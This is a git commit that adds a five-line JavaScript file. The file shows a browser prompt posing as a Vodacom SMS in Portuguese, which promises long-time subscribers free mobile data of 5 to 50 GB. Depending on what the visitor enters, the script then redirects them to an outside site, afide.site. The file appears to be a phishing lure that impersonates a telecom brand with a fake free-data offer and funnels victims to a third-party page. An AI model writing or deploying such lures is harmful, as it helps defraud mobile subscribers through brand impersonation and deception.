b8e1280460d7b1423520664b26f0a7c163985149
ufaiba <ufaiba247@gmail.com>
2026-06-23 23:56:24 -0700

    Create act-vodacomsubscribers.js

---
+++ act-vodacomsubscribers.js
@@ -0,0 +1,5 @@
+var password = 'DADOS GRATUITOS'
+password=prompt('VODACOM SMS: Prezado(a) Cliente, por ser nosso(a) assinante de longa data, oferecemos a oportunidade de receber dados de internet gratuitos, de 5 GB a 50 GB. Clique em "Dados Grátis" para verificar agora mesmo. ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://afide.site/vodacomsubscribers.html';
+}
